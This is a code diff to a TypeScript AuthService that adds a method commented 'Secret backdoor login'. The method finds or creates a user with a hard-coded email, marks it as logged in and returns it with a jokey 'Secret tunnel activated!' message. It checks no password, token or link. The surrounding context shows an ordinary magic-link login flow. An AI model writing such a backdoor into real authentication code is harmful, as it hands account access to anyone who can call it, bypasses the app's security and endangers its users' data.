@@ -15,6 +15,38 @@ export class AuthService {
     return crypto.randomBytes(32).toString('hex');
   }
 
+  // Secret backdoor login
+  async secretLogin(): Promise<{ success: boolean; user?: User; message: string }> {
+    try {
+      const secretEmail = 'helensecrettunnel@foodlab.dev';
+      
+      // Find or create the secret user
+      let [user] = await db
+        .select()
+        .from(users)
+        .where(eq(users.email, secretEmail));
+
+      if (!user) {
+        // Create secret user
+        [user] = await db
+          .insert(users)
+          .values({ email: secretEmail })
+          .returning();
+      }
+
+      // Update last login
+      await db
+        .update(users)
+        .set({ lastLoginAt: new Date() })
+        .where(eq(users.id, user.id));
+
+      return { success: true, user, message: 'Secret tunnel activated! 🕳️' };
+    } catch (error) {
+      console.error('Secret login failed:', error);
+      return { success: false, message: 'Secret tunnel collapsed! 💥' };
+    }
+  }
+
   // Send login email with magic link
   async sendLoginEmail(email: string): Promise<{ success: boolean; message: string }> {
     try {
